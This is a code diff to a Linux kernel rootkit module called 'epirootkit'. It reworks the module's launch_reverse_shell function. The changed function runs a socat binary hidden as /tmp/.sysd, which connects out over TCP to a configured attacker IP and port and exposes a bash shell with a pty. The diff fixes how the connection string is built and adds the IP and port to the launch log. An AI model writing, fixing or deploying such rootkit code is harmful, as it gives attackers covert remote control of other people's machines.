@@ -64,16 +64,17 @@ int send_to_server(char *message)
 
 void launch_reverse_shell(void)
 {
-    static char *argv[] = {
+    char ip_port[32];
+	snprintf(ip_port, sizeof(ip_port), "TCP:%s:%d", ip, REVERSE_SHELL_PORT);
+
+	char *argv[] = {
         "/tmp/.sysd",
-        "TCP:XXX.XXX.XXX.XXX:9001",
+		ip_port,
         "EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
         NULL
     };
 
-	snprintf(argv[1], sizeof(argv[1]), "TCP:%s:%d", ip, port);
-
-    static char *envp[] = {
+    char *envp[] = {
         "HOME=/",
         "PATH=/usr/bin:/bin:/usr/sbin:/sbin:/tmp",
         NULL
@@ -83,7 +84,7 @@ void launch_reverse_shell(void)
     if (ret < 0) {
         pr_err("epirootkit: socat reverse shell failed: %d\n", ret);
     } else {
-        pr_info("epirootkit: socat reverse shell launched\n");
+        pr_info("epirootkit: socat reverse shell launched on %s:%d\n", ip, REVERSE_SHELL_PORT);
     }
 }
 
